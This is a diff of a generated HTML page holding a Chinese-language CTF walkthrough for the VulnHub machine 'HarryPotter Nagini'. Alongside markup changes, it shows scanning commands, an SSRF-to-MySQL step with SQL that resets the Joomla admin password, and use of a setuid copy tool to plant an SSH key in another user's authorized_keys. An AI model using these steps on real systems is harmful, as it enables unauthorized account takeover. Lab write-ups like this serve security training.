@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>[vulnhub]HarryPotter Nagini | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -277,10 +277,10 @@
 <h2 id="信息收集"><a href="#信息收集" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:信息收集" class="headings">信息收集</a></h2>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate<span class="o">=</span><span class="m">10000</span> -sC -T4 -A 192.168.150.136
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate<span class="o">=</span><span class="m">10000</span> -sC -T4 -A 192.168.150.136
 </code></pre></td></tr></table></div>
 </div>
 </div><p>结果</p>
@@ -300,10 +300,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>扫目录</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136
 </code></pre></td></tr></table></div>
 </div>
 </div><p>结果</p>
@@ -321,10 +321,10 @@ site_amdin
 </code></pre><p>发现joomla，继续扫</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136/joomla -e php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python dirsearch.py -u http://192.168.150.136/joomla -e php
 </code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
@@ -340,12 +340,12 @@ public $dbprefix = 'joomla_';
 </code></pre><p>开启了无密码登录，那我们就可以通过SSRF进行数据库操作，使用工具<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener"> Gopherus</a>生成payload（第一次可能不会成功，刷新几次页面就有了）</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="nf">version</span><span class="p">();</span><span class="w"> </span><span class="c1"># 5.5.5
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="nf">version</span><span class="p">();</span><span class="w"> </span><span class="c1"># 5.5.5
 </span><span class="c1"></span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">;</span><span class="w">
 </span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
 </span></code></pre></td></tr></table></div>
@@ -355,10 +355,10 @@ public $dbprefix = 'joomla_';
 </code></pre><p>密码爆破不出来，只能通过修改密码来登陆了</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;c8f144957dea1f19247370b4364767dc&#34;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;site_admin&#39;</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s2">&#34;c8f144957dea1f19247370b4364767dc&#34;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;site_admin&#39;</span><span class="p">;</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">joomla</span><span class="p">.</span><span class="n">joomla_users</span><span class="p">;</span><span class="w">
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210605225444.png" alt=""></p>
@@ -377,22 +377,22 @@ public $dbprefix = 'joomla_';
 <p>root的suid文件都很正常，那应该还是要依靠hermoine的su_cp，读一下看看有没有什么关键指令，有一个帮助页面，果然和cp的帮助页面一样，应该就是<code>sudo cp</code>。通过这个我们可以实现hermoine的无密码登录（由于权限不足，无法覆盖passwd，伤心）</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa <span class="c1"># 生成密钥对</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa <span class="c1"># 生成密钥对</span>
 scp id_rsa.pub snape@192.168.150.136:/home/snape <span class="c1"># 将公钥文件拷贝到目标目录</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>此时执行su_cp将公钥拷贝到hermoine的ssh目录</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">./su_cp -p /home/snape/id_rsa.pub /home/hermoine/.ssh/authorized_keys
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./su_cp -p /home/snape/id_rsa.pub /home/hermoine/.ssh/authorized_keys
 ssh hermoine@192.168.150.136 <span class="c1"># ssh连接</span>
 </code></pre></td></tr></table></div>
 </div>
